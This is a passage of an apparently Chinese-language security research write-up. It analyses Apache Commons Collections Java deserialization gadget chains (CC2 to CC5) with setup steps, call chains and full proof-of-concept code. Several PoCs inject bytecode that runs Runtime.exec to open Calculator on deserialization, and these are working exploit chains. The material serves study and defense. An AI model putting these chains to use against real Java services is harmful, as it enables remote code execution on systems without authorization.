import org.apache.commons.collections4.functors.InvokerTransformer;

import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 1:37 上午
 */
public class CommonsCollectionsGadget2 {
    public static void CC2() throws NoSuchMethodException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NotFoundException, CannotCompileException, IOException{
        Class c1 = Class.forName("org.apache.commons.collections4.functors.InvokerTransformer");
        Constructor constructor = c1.getDeclaredConstructor(String.class);
        constructor.setAccessible(true);
        Transformer transformer = new InvokerTransformer("newTransformer", new Class[]{}, new Object[]{});

        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("CommonsCollectionsEvilCode");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);
        ctClass.writeFile("./");

        byte[] ctClassBytes = ctClass.toBytecode();
        byte[][] targetByteCodes = new byte[][]{ctClassBytes};

        TemplatesImpl templates = new TemplatesImpl();
        Class clazz = Class.forName("com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl");
        Field _name = clazz.getDeclaredField("_name");
        Field _bytecode = clazz.getDeclaredField("_bytecodes");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, targetByteCodes);
        _tfactory.set(templates, new TransformerFactoryImpl());

        TransformingComparator transformingComparator = new TransformingComparator(transformer);
        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Class c2 = Class.forName("java.util.PriorityQueue");
        Field _queue = c2.getDeclaredField("queue");
        _queue.setAccessible(true);
        Object[] queue_array = new Object[]{templates,1};
        _queue.set(priorityQueue,queue_array);

        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);
        try {
            // 序列化操作
            ObjectOutputStream outputStream = new ObjectOutputStream(new FileOutputStream("./CC2EvilGadget2.bin"));
            outputStream.writeObject(priorityQueue);
            outputStream.close();
            // 反序列化操作
            ObjectInputStream inputStream = new ObjectInputStream(new FileInputStream("./CC2EvilGadget2.bin"));
            inputStream.readObject();
            inputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC2();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![undefined](https://p0.ssl.qhimg.com/t01f76471ecd1fb1e6a.png "undefined")

## 调用链
```java
ObjectInputStream.readObject()
    PriorityQueue.readObject()
        PriorityQueue.heapify()
            PriorityQueue.siftDown()
                PriorityQueue.siftDownUsingComparator()
                    TransformingComparator.compare()
                        InvokerTransformer.transform()
                                Method.invoke()
                                    TemplatesImpl.newTransformer()
                                         TemplatesImpl.getTransletInstance()
                                         TemplatesImpl.defineTransletClasses
                                         newInstance()
                                            Runtime.exec()
```

## 总结
利用`PriorityQueue`在反序列化后会对队列进行优先级排序的特点，为其指定`TransformingComparator`排序方法，并在其中为其添加`Transforer`，与`CommonsCollections1`链类似，主要的触发位置还是`InvokerTransformer`。

# CommonsCollections3链
## 环境搭建
1. `JDK`版本：JDK1.8u66（要求JDK8u71以下）
2. `Commons-Collections`版本：3.1

利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

## 前置知识
### TrAXFilter
这个类的构造函数中调用了`(TransformerImpl) templates.newTransformer()`，免去了用`InvokerTransformer`手工调用`newTransformer()`方法。

![undefined](https://p3.ssl.qhimg.com/t010875e8a9aefbf9db.png "undefined")

### InstantiateTransformer
上面虽然直接调用了`newTransformer()`，但是缺少了`InvokerTransformer`，`TrAXFilter`的构造方法也是无法调用的，因此这里利用`Commons-Collections`提供的`org.apache.commons.collections.functors.InstantiateTransformer`来通过反射创建类的实例，`transform()`方法接收一个`Class`类型的对象，通过`getConstructor()`来获取构造方法，并通过`newInstance()`创建类实例。

![undefined](https://p2.ssl.qhimg.com/t019efb9a2fb2966e25.png "undefined")

## CommonsCollections3 分析
`CommonsCollections3`链其实是`CommonsCollections1`链和`CommonsCollections2`链的结合，为了绕过⼀些规则对`InvokerTransformer`的限制，`CommonsCollections3`并没有使⽤到`InvokerTransformer`来调⽤任意⽅法，根据上面的前置知识，可以利⽤`InstantiateTransformer()`来调⽤到`TrAXFilter()`的构造⽅法，再利⽤其构造⽅法⾥的`templates.newTransformer()`调⽤到`TemplatesImpl`⾥的字节码，这样就比避免使用`InvokerTransformer`。

```java
package CommonsCollections3;

import java.io.*;
import java.lang.*;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.ClassClassPath;
import javassist.ClassPool;
import javassist.CtClass;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 10:33 下午
 */
public class TrAxFilterDemo {

    public static void trAxFilterDemo() throws IllegalAccessException, NoSuchFieldException, NotFoundException, CannotCompileException, IOException {
        ClassPool classPool = ClassPool.getDefault();
        classPool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = classPool.makeClass("Evil");
        ctClass.setSuperclass(classPool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetByteCode = new byte[][]{shellCode};

        TemplatesImpl templates = new TemplatesImpl();
        Class c1 = templates.getClass();
        Field _name = c1.getDeclaredField("_name");
        Field _bytecode = c1.getDeclaredField("_bytecodes");
        Field _tfactory = c1.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, targetByteCode);
        _tfactory.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, chainedTransformer);
        outerMap.put("d1no", "web");
    }

    public static void main(String[] args) {
        try {
            trAxFilterDemo();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![undefined](https://p3.ssl.qhimg.com/t01295191a7456840b8.png "undefined")

### TransformedMap

```java
package CommonsCollections3;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.TransformedMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Retention;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/29 9:38 下午
 */
public class CommonsCollections3TransformedMap {

    public static void CC3() throws NotFoundException, CannotCompileException, IOException, IllegalAccessException, NoSuchFieldException, ClassNotFoundException, NoSuchMethodException, InvocationTargetException, InstantiationException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellByteCode = ctClass.toBytecode();
        byte[][] targetByteCode = new byte[][]{shellByteCode};

        TemplatesImpl obj = new TemplatesImpl();
        Class _class = obj.getClass();
        Field _name = _class.getDeclaredField("_name");
        Field _bytecode = _class.getDeclaredField("_bytecodes");
        Field _tfactory = _class.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(obj, "h3rmesk1t");
        _bytecode.set(obj, targetByteCode);
        _tfactory.set(obj, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
        map.put("value", "d1no");
        Map map1 = TransformedMap.decorate(map, null, chainedTransformer);
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        Object object = constructor.newInstance(Retention.class, map1);

        try {
            // 序列化
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(object);
            objectOutputStream.close();

            // 反序列化
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC3();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

<img src="./images/12.png" alt="">

### LazyMap

```java
package CommonsCollections3;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;
import org.apache.commons.collections.map.LazyMap;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.*;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 1:20 上午
 */
public class CommonsCollections3LazyMap {

    public static void CC3() throws CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, InvocationTargetException, InstantiationException, NoSuchMethodException, ClassNotFoundException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Rvil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetShellCode = new byte[][]{shellCode};

        TemplatesImpl templates = new TemplatesImpl();
        Class _class = templates.getClass();
        Field _name = _class.getDeclaredField("_name");
        Field _bytecode = _class.getDeclaredField("_bytecodes");
        Field _tfactory = _class.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(templates, "h3rmesk1t");
        _bytecode.set(templates, targetShellCode);
        _tfactory.set(templates, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map map = new HashMap();
        Map map1 = LazyMap.decorate(map, chainedTransformer);

        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor constructor = c.getDeclaredConstructor(Class.class, Map.class);
        constructor.setAccessible(true);
        InvocationHandler handler = (InvocationHandler) constructor.newInstance(Target.class, map1);
        Map proxyMap = (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[]{Map.class}, handler);
        handler = (InvocationHandler) constructor.newInstance(Target.class, proxyMap);

        try {
            // 序列化
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(handler);
            objectOutputStream.close();

            // 反序列化
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC3();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```

![undefined](https://p4.ssl.qhimg.com/t014961a6ccb92d7887.png "undefined")

## 调用链

```java
AnnotationInvocationHandler.readObject()
   Map(Proxy).entrySet()
        AnnotationInvocationHandler.invoke()
            LazyMap.get()
                ChainedTransformer.transform()
                    ConstantTransformer.transform()
                        InstantiateTransformer.transform()
                            TemplatesImpl.newTransformer()
```

## 总结
利用`AnnotationInvocationHandler`在反序列化时会触发`Map`的`get/set`等操作，配合`LazyMap`在执行`Map`对象的操作时会根据不同情况调用`Transformer`的转换方法，利用了`InstantiateTransformer`实例化`TrAXFilter`类，并调用`TemplatesImpl`的`newTransformer`方法实例化恶意类字节码触发漏洞。

# CommonsCollections4链
## 环境搭建
1. `JDK`版本：JDK1.8u66(暂无版本限制)
2. `Commons-Collections4`版本：4.0

利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>org.apache.commons</groupId>
            <artifactId>commons-collections4</artifactId>
            <version>4.0</version>
        </dependency>
    </dependencies>

</project>
```

## 前置知识
### TreeBag & TreeMap
在`CommonsCollection2`中，使用了优先级队列`PriorityQueue`反序列化时会调用`comparator`的`compare`方法的特性，配合`TransformingComparator`触发`transformer`，按照这个思路找到另一个提供排序的类`TreeBag`，其在反序列化的时候会调用比较器。

`Bag`接口继承自`Collection`接口，定义了一个集合，该集合会记录对象在集合中出现的次数，它有一个子接口`SortedBag`，定义了一种可以对其唯一不重复成员排序的`Bag`类型。

![undefined](https://p1.ssl.qhimg.com/t01423b688bcb522d4a.png "undefined")

![undefined](https://p0.ssl.qhimg.com/t015a26906ff804cb39.png "undefined")

`TreeBag`是对`SortedBag`的一个标准实现，`TreeBag`使用`TreeMap`来储存数据，并使用指定`Comparator`来进行排序，`TreeBag`继承自`AbstractMapBag`实现了`SortedBag`接口，初始化`TreeBag`时会创建一个新的`TreeMap`储存在成员变量`map`里，而排序使用的`Comparator`则直接储存在`TreeMap`中。

![undefined](https://p0.ssl.qhimg.com/t01a959ecb3c36a35f6.png "undefined")

![undefined](https://p2.ssl.qhimg.com/t01d52fc8455e823834.png "undefined")

在对`TreeBag`反序列化时，会将反序列化出来的`Comparator`对象交给`TreeMap`实例化，并调用父类的`doReadObject`方法进行处理。

![undefined](https://p0.ssl.qhimg.com/t012cd0a7cf680fbf99.png "undefined")

在`doReadObject`方法中会向`TreeMap`中`put`数据。

![undefined](https://p4.ssl.qhimg.com/t0197333442de4fc580.png "undefined")

对于这种有序的储存数据的集合，反序列化数据时一定会对其进行排序动作，而`TreeBag`则是依赖了`TreeMap`在`put`数据时会调用`compare`进行排序的特点来实现数据顺序的保存。

![undefined](https://p3.ssl.qhimg.com/t01710673a1a5b378ba.png "undefined")

而在`compare`方法中调用了`comparator`进行比较，以使用`TransformingComparator`触发后续的逻辑。

![undefined](https://p3.ssl.qhimg.com/t0193c90cdd7d111775.png "undefined")

## Commons-Collections4 分析
### POC-1
该利用链沿用了`CommmonsCollections3`链利用`TrAXFilter`类的构造函数去触发`TemplatesImpl#newTransformer`加载恶意字节码的方法，沿用了`CommonsCollections2`链通过`PriorityQueue`触发`TransformingComparator.compare()`进而调用传入的`transformer`对象的`transform`方法。

```java
package CommonsCollections4;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 10:55 上午
 */
public class CommmonsCollections4PriorityQueue {

    public static void CC4() throws CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException, NotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetCode = new byte[][]{shellCode};

        TemplatesImpl obj = new TemplatesImpl();
        Class clazz = obj.getClass();
        Field _name = clazz.getDeclaredField("_name");
        Field _bytecode = clazz.getDeclaredField("_bytecodes");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(obj, "h3rmesk1t");
        _bytecode.set(obj, targetCode);
        _tfactory.set(obj, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        PriorityQueue priorityQueue = new PriorityQueue(2);
        priorityQueue.add(1);
        priorityQueue.add(2);
        Field field = Class.forName("java.util.PriorityQueue").getDeclaredField("comparator");
        field.setAccessible(true);
        field.set(priorityQueue, transformingComparator);

        try {
            // 序列化
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(priorityQueue);
            objectOutputStream.close();

            // 反序列化
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC4();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
![undefined](https://p1.ssl.qhimg.com/t012797cc7d4e6c569b.png "undefined")

### POC-2
相较于`POC-1`，这里使用`TreeBag`和`TreeMap`来替代`PriorityQueue`进行构造。

```java
package CommonsCollections4;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.bag.TreeBag;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.functors.InvokerTransformer;

import javax.xml.transform.Templates;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 11:26 上午
 */
public class CommonsCollectionsTreeBag {

    public static void CC4() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetCode = new byte[][]{shellCode};

        TemplatesImpl obj = new TemplatesImpl();
        Class _class = obj.getClass();
        Field _name = _class.getDeclaredField("_name");
        Field _bytecode = _class.getDeclaredField("_bytecodes");
        Field _tfactory = _class.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(obj, "h3rmesk1t");
        _bytecode.set(obj, targetCode);
        _tfactory.set(obj, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        TransformingComparator transformingComparator = new TransformingComparator(chainedTransformer);

        TreeBag treeBag = new TreeBag(transformingComparator);
        treeBag.add(obj);

        try {
            // 序列化
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(treeBag);
            objectOutputStream.close();

            // 反序列化
            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (IOException e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC4();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
![undefined](https://p4.ssl.qhimg.com/t019962cb8929b6b02c.png "undefined")

## 调用链
PriorityQueue：
```java
PriorityQueue.readObject()
    TransformingComparator.compare()
        *ChainedTransformer.transform()
                InvokerTransformer.transform()
                    InstantiateTransformer.transform()
                        TemplatesImpl.newTransformer() 
```

TreeBag：
```java
org.apache.commons.collections4.bag.TreeBag.readObject()
    org.apache.commons.collections4.bag.AbstractMapBag.doReadObject()
        java.util.TreeMap.put()
            java.util.TreeMap.compare()
                org.apache.commons.collections4.comparators.TransformingComparator.compare()
                        org.apache.commons.collections4.functors.InvokerTransformer.transform()
```

## 总结
使用`PriorityQueue`反序列化时触发的`TransformingComparator`的`compare`方法，就会触发`ChainedTransformer`的`tranform`方法链，其中利用`InstantiateTransformer`实例化`TrAXFilter`类，此类实例化时会调用`TemplatesImpl`的`newTransformer`实例化恶意类，执行恶意代码。

用`TreeBag`代替`PriorityQueue`触发`TransformingComparator`，后续依旧使用`Transformer`的调用链。

# CommonsCollections5链
## 环境搭建
1. `JDK`版本：JDK1.8u66
2. `Commons-Collections`版本：3.1

利用`maven`来进行搭建，先创建一个`Maven`项目，不用选择任何`Maven`模板，`pom.xml`中内容如下，之后选择右侧的更新，让其自动导入包即可。

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

## 前置知识
### TiedMapEntry
`org.apache.commons.collections.keyvalue.TiedMapEntry`是一个`Map.Entry`的实现类，它绑定了底层`map`的`Entry`，用来使一个`map entry`对象拥有在底层修改`map`的功能。

![undefined](https://p1.ssl.qhimg.com/t0158f8b6d52cc84c6c.png "undefined")

`TiedMapEntry`中有一个成员属性`Map`，`TiedMapEntry`的`getValue()`方法会调用底层`map`的`get()`方法，可以用来触发`LazyMap`的`get`，继续跟进分析，发现`TiedMapEntry`的`equals/hashCode/toString`都可以触发。

![undefined](https://p5.ssl.qhimg.com/t019d9ab6dea72d2cef.png "undefined")

测试代码：

```java
package CommonsCollections5;

import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import javassist.*;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.comparators.TransformingComparator;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InstantiateTransformer;

import javax.xml.transform.Templates;
import java.io.IOException;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 1:47 下午
 */
public class TiedMapEntryDemo {

    public static void TiedMapEntryDemo() throws NotFoundException, CannotCompileException, NoSuchFieldException, IllegalAccessException, IOException {
        ClassPool pool = ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass ctClass = pool.makeClass("Evil");
        ctClass.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String shell = "java.lang.Runtime.getRuntime().exec(\"open -a /System/Applications/Calculator.app\");";
        ctClass.makeClassInitializer().insertBefore(shell);

        byte[] shellCode = ctClass.toBytecode();
        byte[][] targetCode = new byte[][]{shellCode};

        TemplatesImpl obj = new TemplatesImpl();
        Class clazz = obj.getClass();
        Field _name = clazz.getDeclaredField("_name");
        Field _bytecode = clazz.getDeclaredField("_bytecodes");
        Field _tfactory = clazz.getDeclaredField("_tfactory");
        _name.setAccessible(true);
        _bytecode.setAccessible(true);
        _tfactory.setAccessible(true);
        _name.set(obj, "h3rmesk1t");
        _bytecode.set(obj, targetCode);
        _tfactory.set(obj, new TransformerFactoryImpl());

        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(TrAXFilter.class),
                new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{obj})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map hashMap = new HashMap();
        Map map = LazyMap.decorate(hashMap, chainedTransformer);
        TiedMapEntry tiedMapEntry = new TiedMapEntry(map, 1);
        tiedMapEntry.toString();
    }

    public static void main(String[] args) {
        try {
            TiedMapEntryDemo();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
![undefined](https://p4.ssl.qhimg.com/t01a4a6c358e38e1a44.png "undefined")

### BadAttributeValueExpException
在`javax.management.BadAttributeValueExpException`类中，当`System.getSecurityManager() == null`或者`valObj`是除了`String`的其他基础类型时，都会调用`valObj`的`toString()`方法，利用这个触发点来配合前面的`TiedMapEntry`完成链子的构造。

![undefined](https://p0.ssl.qhimg.com/t01089f66e67fcc18ac.png "undefined")

## CommonsCollections5 分析
